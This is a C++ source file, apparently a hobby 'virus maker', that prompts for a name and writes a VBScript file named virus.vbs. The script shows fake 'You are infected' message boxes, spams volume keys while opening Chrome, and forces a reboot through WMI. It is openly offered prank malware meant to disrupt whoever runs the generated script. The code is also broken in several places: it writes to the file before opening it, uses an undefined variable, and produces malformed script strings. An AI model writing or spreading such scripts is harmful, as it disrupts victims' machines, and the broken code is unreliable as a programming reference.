/*-----------------------------------|
|CosmoXD(c) 2019                     |
|                                    |       
|           MIT LICENSE              |
|                                    |
|-----------------------------------*/
#include <iostream>
#include <fstream>
#include <string>

#define endl "\n"
#define clearConsole system("clear");

void showOptions()
{
    std::cout << "1. Open other alert" << endl;
    std::cout << "2. Open WebSite(ONLY CHROME!)" << endl;
    std::cout << "3. Reboot PC" << endl;
    std::cout << "4. End Virus" << endl;
}

void showEnglish()
{
    std::ofstream virus;
    char nombreVirus[500];
    try
    {
        std::cout << "Now say me your virus name: ";
        std::cin >> nombreVirus;
        virus << nombreVirus;
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
        std::cout << "ERROR!, The virus name cannot have spaces!. 0x3" << endl;
    }
    

    //This part create the virus file
    try
    {
        virus.open("virus.vbs", std::ios::ate);
        virus << "msgbox(\"" << "You are infected by the virus:" << " " << nombreVirus << "\")";
    }
    catch(const std::exception& e)
    {
        std::cout << "ERROR Creating the virus.vbs file!. 0x2" << endl;
    }

    std::cout << "Now select what the virus make now" << endl;

    //This is the "main loop" what write the events
    for(int i = 0; i < 1000; i++)
    {
        int option;
        showOptions();
        scanf("%i", &option);
        if(option == 1)
        {
            std::cout << "Please tell me what other message do you want the program to display: ";
            char mensaje[500];
            std::cin >> mensaje;
            virus << endl << "msgbox(\"" << mensaje << "\")";
            clearConsole
        }
        else if (option == 2)
        {
            char abrirWebChrome[] = 
            endl
            "Option Explicit"
            endl
            "Dim URL,WshShell,i"
            endl
            "URL = \"www.google.com\""
            endl
            "Set WshShell = CreateObject(\"WScript.shell\")"
            endl
            "For i = 0 to 50"
            endl
            "WshShell.SendKeys(chr(175))"
            endl
            "Next"
            endl
            "WshShell.run \"CMD /C start chrome.exe\" & URL & "",0,False"
            endl;
            virus << abrirWebChrome;
            clearConsole
        }
        else if(option == 3)
        {
            char reiniciarPC[] = 
            endl
            "Set OpSysSet = GetObject(\"winmgmts:{impersonationLevel=impersonate,(RemoteShutdown)}//\" & mname).ExecQuery(\"select * from Win32_OperatingSystem where Primary=true\")"
            endl
            "for each OpSys in OpSysSet"
            "   OpSys.Reboot()"
            endl
            "next";
            virus << reiniciarPC;
            clearConsole
        }
        else if(option == 4)
        {
            break;
            std::cout << "BYE!";
            system("PAUSE");
        }
        i++;
    }
}